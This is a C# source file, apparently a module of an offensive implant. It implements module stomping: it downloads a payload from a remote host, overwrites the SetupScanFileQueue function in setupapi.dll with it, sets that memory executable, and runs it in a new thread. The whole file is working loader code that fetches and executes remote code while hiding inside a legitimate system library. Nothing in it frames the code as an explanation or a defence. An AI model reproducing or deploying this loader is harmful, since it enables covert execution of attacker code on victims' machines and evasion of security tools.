using System;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace HTTPImplant.Modules
{
    internal class ModuleStomper
    {
        const string SACRIFICIAL_DLL = "setupapi.dll";
        const string SACRIFICIAL_FUNC = "SetupScanFileQueue";

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        public static async Task Execute(string hostname, string port, string file)
        {

            byte[] payload = await CodeFetch.FetchCode(hostname, port, file);
            if (payload == null)
            {
                Console.WriteLine("Failed to fetch data.");
            }

            IntPtr hModule = LoadLibrary(SACRIFICIAL_DLL);
            if (hModule == IntPtr.Zero)
            {
                Console.WriteLine($"[!] LoadLibraryA Failed With Error: {Marshal.GetLastWin32Error()}");
                return;
            }

            IntPtr pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
            if (pAddress == IntPtr.Zero)
            {
                Console.WriteLine($"[!] GetProcAddress Failed With Error: {Marshal.GetLastWin32Error()}");
                return;
            }

            if (!WritePayload(pAddress, payload))
            {
                return;
            }

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, pAddress, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread != IntPtr.Zero)
            {
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
        }

        static bool WritePayload(IntPtr pAddress, byte[] payload)
        {
            uint oldProtect;
            if (!VirtualProtect(pAddress, (uint)payload.Length, 0x04, out oldProtect))
            {
                Console.WriteLine($"[!] VirtualProtect [RW] Failed With Error: {Marshal.GetLastWin32Error()}");
                return false;
            }

            Marshal.Copy(payload, 0, pAddress, payload.Length);

            if (!VirtualProtect(pAddress, (uint)payload.Length, 0x40, out oldProtect))
            {
                Console.WriteLine($"[!] VirtualProtect [RWX] Failed With Error: {Marshal.GetLastWin32Error()}");
                return false;
            }

            return true;
        }
    }
}
